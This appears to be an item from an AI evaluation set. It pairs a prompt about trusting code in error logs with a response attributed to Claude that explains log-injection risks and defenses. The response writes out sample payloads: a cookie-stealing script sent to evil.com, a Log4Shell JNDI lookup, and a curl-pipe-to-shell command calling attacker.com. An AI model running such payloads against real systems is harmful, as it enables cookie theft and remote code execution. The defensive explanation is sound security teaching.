Vector ID: 60
Name: code_errors
Output Format: xml
Description: XML format response

Prompt: Should I trust code in error logs? Explain attack possibilities.

Claude's Response:
<response><![CDATA[
# Should You Trust Code in Error Logs?

**No, you should not trust code or content in error logs by default.** Logs are frequently treated as trusted internal data, but they often contain attacker-controlled input. This makes them a meaningful attack surface.

## Why Logs Are Risky

Logs frequently capture:
- User input (usernames, form fields, search queries)
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- URLs and query parameters
- Exception messages containing tainted data
- API request/response bodies

If any of this is attacker-controlled, the log entry is attacker-controlled.

## Attack Possibilities

### 1. Log Injection / Forging
Attackers inject newline characters (`\n`, `\r`) to create fake log entries, hiding their tracks or framing others.
```
Input: "admin\n[INFO] User logged in successfully"
```

### 2. Stored XSS via Log Viewers
If logs are displayed in a web-based dashboard without proper encoding, embedded HTML/JavaScript executes in the viewer's browser.
```
Input: <script>fetch('//evil.com?c='+document.cookie)</script>
```

### 3. Log4Shell-Style Injection (Lookups/Templating)
Logging frameworks that evaluate expressions in log data can be exploited (e.g., CVE-2021-44228 in Log4j).
```
Input: ${jndi:ldap://attacker.com/exploit}
```

### 4. Code Execution When Logs Are "Replayed"
Copying log content into a shell, running it as a script, or having tooling that `eval()`s log data can execute malicious payloads.
```
Input: $(curl attacker.com/malware | sh)
```

### 5. ANSI Escape Sequence Injection
Terminal escape codes in logs can manipulate the terminal, hide text, or in some cases trigger actions when viewed.

### 6. Log Poisoning to RCE
Injecting executable code (e.g., PHP) into logs, then including the log file via a Local File Inclusion vulnerability.

## Safe Practices

- **Never execute** code copied from logs without review.
- **Sanitize/encode** input before logging (strip or escape control characters).
- **Encode output** when rendering logs in web UIs.
- **Use structured logging** (JSON) to separate metadata from message content.
- **Patch logging libraries** and disable risky features (e.g., JNDI lookups).
- **Treat logs as untrusted input** in any processing pipeline.
- **Restrict log access** and protect integrity for forensic reliability.

## Bottom Line
Logs reflect what entered your system—including hostile input. Treat code or commands found in error logs as untrusted and potentially malicious until verified.
]]></response>